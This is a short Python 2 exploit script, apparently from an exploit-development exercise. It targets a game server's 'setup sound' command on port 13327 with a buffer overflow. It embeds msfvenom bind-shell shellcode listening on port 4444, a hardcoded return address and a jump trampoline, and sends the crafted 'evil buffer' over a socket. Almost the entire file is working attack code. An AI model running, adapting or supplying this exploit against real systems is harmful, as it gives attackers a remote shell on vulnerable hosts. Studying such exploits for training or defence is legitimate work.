#!/usr/bin/python 
# coding: utf-8
import socket 
 
host = "127.0.0.1" 

#msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b "\x00\x0a\x0d\x20" â€“e x86/shikata_ga_nai

shellcode = ("\xba\xd6\x8e\xd1\xb4\xdd\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x14\x31\x56\x14\x83\xee\xfc\x03\x56\x10\x34\x7b\xe0\x6f\x4f"
"\x67\x50\xd3\xfc\x02\x55\x5a\xe3\x63\x3f\x91\x63\xd8\x9e\x7b"
"\x0b\xdd\x1e\x6d\x97\x8b\x0e\xdc\x77\xc5\xce\xb4\x11\x8d\xdd"
"\xc9\x54\x6c\xda\x7a\x62\xdf\x84\xb1\xea\x5c\xf9\x2c\x27\xe2"
"\x6a\xe9\xdd\xdc\xd4\xc7\xa1\x6a\x9c\x2f\xc9\x43\x71\xa3\x61"
"\xf4\xa2\x21\x18\x6a\x34\x46\x8a\x21\xcf\x68\x9a\xcd\x02\xea")

# The "\x83\xc0\x0c\xff\xe0" is from our nasm out giving the instruction to add 12 bytes and jmp eax. The two "\x90\x90" "NOP" bytes at the end were to add a padding to our 5bytes added.

#crash = "\x41" * 4368 + "\xd7\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0\x90\x90"

ret ="\xd7\x45\x13\x08"
#ret ="\x97\x45\x13\x08"

crash = shellcode + "\x41" * (4368 - 105) + ret + "\x83\xc0\x0c\xff\xe0\x90\x90" 

buffer = "\x11(setup sound " + crash + "\x90\x00#"  
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

print "[*]Sending evil buffer..." 

s.connect((host, 13327))

data=s.recv(1024) 

print data 

s.send(buffer) 

s.close() 

print "[*]Payload Sent !"
